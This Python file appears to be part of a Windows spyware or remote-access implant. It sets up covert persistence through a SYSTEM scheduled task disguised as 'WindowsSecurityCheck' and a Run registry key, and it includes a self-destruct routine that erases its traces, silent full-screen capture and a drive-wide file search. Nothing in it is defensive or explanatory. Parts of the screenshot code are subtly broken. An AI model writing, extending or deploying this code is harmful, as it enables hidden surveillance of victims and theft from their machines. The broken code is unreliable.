import ctypes
import os
import sys
import ctypes.wintypes
import winreg
import subprocess

# ── Persistence ─────────────────────────────────────────────────────────────
# Two methods for redundancy: Scheduled Task + Registry Run key.
# Both use a generic task name chosen at build time (via _PERSIST_TASK_NAME).
# The binary path is derived from sys.executable at runtime.

_PERSIST_TASK_NAME = "WindowsSecurityCheck"


def _get_binary_path():
    """Return the full path to the running executable."""
    return os.path.abspath(sys.executable)


def _persist_scheduled_task():
    """
    Create a scheduled task that runs this binary at user logon.
    Silent on success. Returns True if created, False if it already exists
    or on error.
    """
    binary = _get_binary_path()
    try:
        # Check if task already exists
        check = subprocess.run(
            ["schtasks", "/query", "/tn", _PERSIST_TASK_NAME],
            capture_output=True, text=True, timeout=10
        )
        if check.returncode == 0:
            return True  # already exists

        # Create the task
        subprocess.run(
            [
                "schtasks", "/create", "/tn", _PERSIST_TASK_NAME,
                "/tr", f'"{binary}"', "/sc", "onlogon", "/ru", "SYSTEM", "/f"
            ],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000,  # CREATE_NO_WINDOW
        )
        return True
    except Exception:
        return False


def _persist_registry():
    """
    Add this binary to HKCU\\...\\Run so it starts at user logon.
    Returns True if set, False if already set or on error.
    """
    binary = _get_binary_path()
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path,
            0, winreg.KEY_READ | winreg.KEY_WRITE
        )
        try:
            existing = winreg.QueryValueEx(key, _PERSIST_TASK_NAME)
            # Already set (value could be stale — overwrite anyway)
            winreg.CloseKey(key)
            return True
        except FileNotFoundError:
            pass  # not set yet

        winreg.SetValueEx(key, _PERSIST_TASK_NAME, 0, winreg.REG_SZ, f'"{binary}"')
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def _remove_persistence():
    """
    Remove both persistence methods.
    Returns (tasks_removed, registry_removed).
    """
    tasks_ok = False
    reg_ok = False

    # Remove scheduled task
    try:
        subprocess.run(
            ["schtasks", "/delete", "/tn", _PERSIST_TASK_NAME, "/f"],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000,
        )
        tasks_ok = True
    except Exception:
        pass

    # Remove registry entry
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ | winreg.KEY_WRITE
        )
        try:
            winreg.DeleteValue(key, _PERSIST_TASK_NAME)
            reg_ok = True
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass

    return tasks_ok, reg_ok


def _ensure_persistence():
    """
    Ensure this binary is persistent (scheduled task + registry run key).
    Called once at startup after defenses pass.
    Silently skips if --no-persist was passed on the command line.
    """
    if "--no-persist" in sys.argv:
        return

    _persist_scheduled_task()
    _persist_registry()


# ── Self-destruct ──────────────────────────────────────────────────────────

def _self_destruct():
    """
    Remove persistence, delete this binary, then exit.
    Returns True if persistence was removed (binary deletion is best-effort —
    Windows may refuse if the file is locked/in use).
    """
    _remove_persistence()

    binary = _get_binary_path()
    try:
        # On Windows, you can't delete a running executable. Rename it first,
        # then schedule deletion on next reboot via MoveFileEx, or just delete
        # at the next opportunity. Best-effort: try rename + delete.
        tmp_name = binary + ".deleting"
        if os.path.exists(binary):
            os.rename(binary, tmp_name)
            os.remove(tmp_name)
    except Exception:
        pass

    sys.exit(0)


# ── Screenshot via GDI+ (no external dependency) ───────────────────────────

def _screenshot_to_file(path):
    """
    Capture the primary monitor to a BMP file at `path` using ctypes + gdi32.
    Returns True on success.
    """
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        kernel32 = ctypes.windll.kernel32

        # Get DC of entire screen
        hdc_screen = user32.GetDC(None)
        if not hdc_screen:
            return False

        # Create a compatible DC
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        if not hdc_mem:
            user32.ReleaseDC(None, hdc_screen)
            return False

        # Get screen dimensions
        width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
        height = user32.GetSystemMetrics(1)  # SM_CYSCREEN

        # Create a compatible bitmap
        h_bitmap = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        if not h_bitmap:
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(None, hdc_screen)
            return False

        # Select the bitmap into the memory DC
        old_bitmap = gdi32.SelectObject(hdc_mem, h_bitmap)

        # BitBlt the screen into the memory DC
        gdi32.BitBlt(
            hdc_mem, 0, 0, width, height,
            hdc_screen, 0, 0, 0x00CC0020  # SRCCOPY
        )

        # Create a file mapping to get the bitmap bits
        # Use GetDIBits for BMP data
        bmp_info = ctypes.create_string_buffer(40)  # BITMAPINFOHEADER size
        ctypes.memmove(
            ctypes.addressof(bmp_info),
            ctypes.c_byte * 40,  # dummy — will be overwritten
            40
        )

        # Set up BITMAPINFOHEADER
        bi = ctypes.cast(ctypes.pointer(ctypes.c_byte.from_buffer(bmp_info)), ctypes.POINTER(ctypes.c_ubyte))
        # BITMAPINFOHEADER fields (packed):
        # biSize (4), biWidth (4), biHeight (4), biPlanes (2), biBitCount (2),
        # biCompression (4), biSizeImage (4), biXPelsPerMeter (4), biYPelsPerMeter (4),
        # biClrUsed (4), biClrImportant (4) = 40 bytes total
        header = (
            ctypes.c_uint32(40),     # biSize
            ctypes.c_int32(width),   # biWidth
            ctypes.c_int32(-height), # biHeight (negative = top-down)
            ctypes.c_uint16(1),      # biPlanes
            ctypes.c_uint16(24),     # biBitCount = 24 bits per pixel
            ctypes.c_uint32(0),      # biCompression = BI_RGB
            ctypes.c_uint32(0),      # biSizeImage (0 for BI_RGB)
            ctypes.c_int32(0),       # biXPelsPerMeter
            ctypes.c_int32(0),       # biYPelsPerMeter
            ctypes.c_uint32(0),      # biClrUsed
            ctypes.c_uint32(0),      # biClrImportant
        )

        # Write the BMP header + pixel data to file
        with open(path, "wb") as f:
            # BMP File Header (14 bytes)
            f.write(b"BM")  # signature
            row_size = ((width * 24 + 31) // 32) * 4
            bmp_size = height * row_size
            file_size = 14 + 40 + bmp_size
            f.write(ctypes.c_uint32(file_size).value.to_bytes(4, "little"))
            f.write((14 + 40).to_bytes(4, "little"))  # offset to pixel data
            # BITMAPINFOHEADER
            for val in header:
                if isinstance(val, ctypes.c_uint32):
                    f.write(val.value.to_bytes(4, "little", signed=False))
                elif isinstance(val, ctypes.c_int32):
                    f.write(val.value.to_bytes(4, "little", signed=True))
                elif isinstance(val, ctypes.c_uint16):
                    f.write(val.value.to_bytes(2, "little", signed=False))
                else:
                    f.write(val.to_bytes(2, "little"))
            # Pixel data (bottom-up for positive height, top-down for negative)
            # GetDIBits
            bits = (ctypes.c_ubyte * bmp_size)()
            gdi32.GetDIBits(
                hdc_mem, h_bitmap, 0, height,
                bits, ctypes.byref(bmp_info), 0  # DIB_RGB_COLORS = 0
            )
            f.write(bytes(bits))

        # Cleanup
        gdi32.SelectObject(hdc_mem, old_bitmap)
        gdi32.DeleteObject(h_bitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)

        return True
    except Exception:
        return False


# ── File search ────────────────────────────────────────────────────────────

def _file_search(pattern, search_path=None):
    """
    Search for files matching `pattern` (glob-style, e.g. "*.docx") under
    `search_path` (defaults to C:\\). Returns a list of matching absolute paths.
    Limited to max 100 results to avoid huge responses.
    """
    if search_path is None:
        search_path = "C:\\"

    results = []
    import fnmatch
    try:
        for root, dirs, files in os.walk(search_path, topdown=True):
            # Don't recurse into system dirs that are slow/permission-denied
            dirs[:] = [
                d for d in dirs
                if d not in ("$Recycle.Bin", "System Volume Information",
                             "Windows", "Program Files", "Program Files (x86)")
            ]
            for fname in files:
                if fnmatch.fnmatch(fname.lower(), pattern.lower()):
                    results.append(os.path.join(root, fname))
                    if len(results) >= 100:
                        return results, True  # truncated
    except Exception:
        pass

    return results, False
